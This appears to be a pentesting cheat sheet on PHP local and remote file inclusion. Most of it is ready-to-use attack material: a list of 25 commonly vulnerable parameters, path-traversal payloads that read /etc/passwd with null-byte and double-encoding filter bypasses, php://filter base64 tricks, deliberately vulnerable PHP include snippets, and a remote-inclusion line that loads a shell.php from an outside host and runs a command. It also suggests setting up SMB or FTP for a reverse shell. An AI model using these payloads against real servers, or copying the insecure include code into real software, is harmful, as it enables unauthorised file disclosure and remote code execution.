
**Remote File Inclusion (RFI):** The file is loaded from a remote server. In php this is **disabled** by default (**allow_url_include**).  
**Local File Inclusion (LFI):** The sever loads a local file. 

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.


>Basic
```sh
http://example.com/index.php?page=../../../etc/passwd
```

>25 parameters that could be vulnerable to local file inclusion
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

**Theory**

the attacker can include source code files or view files that are located _within the document root directory_ and its subdirectories, but it does not mean that the attacker can reach outside of the document root.
``` php
<?PHP 
    $file = $_GET["file"];
    $handle = fopen($file, 'r');
    $poem = fread($handle, 1);
    fclose($handle);
    echo $poem;
?>
```

```http
?file=../../../poem.txt
```

**Local:**

```sh
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd

#Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php")
http://example.com/index.php?page=../../../etc/passwd%00

#encode
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

#Maybe the back-end is checking the folder path
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd

```


**Remote**: 

The developer of a PHP application wants to include a source code file from another server but the included file is not static. The following is a code snippet from the _index.php_ file.

```php
<?PHP 
  $module = $_GET["module"];
  include $module;
?>
```
The server runs PHP 7.3.33. The _php.ini_ file includes the following configuration parameter:
```
allow_url_include = On
```

The URL is taken directly from the GET HTTP request, so you can include the module _http://server2.example.com/welcome.php_ as follows:

```
http://example.com/index.php?module=http://server2.example.com/welcome.php
```


>RCE
```sh
?file=http://<Collaborator>/shell.php&cmd=id

# Try setting up SMB , FTP for rev shell

```




**PHP Wrappers & Protocols**

PHP filters allow perform basic **modification operations on the data** before being it's read or written. **4 types of filters**: String Filters, Conversion Filters, Compression Filters, and Encryption Filters

```sh
http://example.com/index.php?file=config

#php fillter using  base64 encode in URL
?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd


#Conversion 
convert.base64-encode
#String
string.rot13
#Compression
zlib.deflat
```


RCE : https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=file%20inclusion#arbitrary-file-write-via-path-traversal-webshell-rce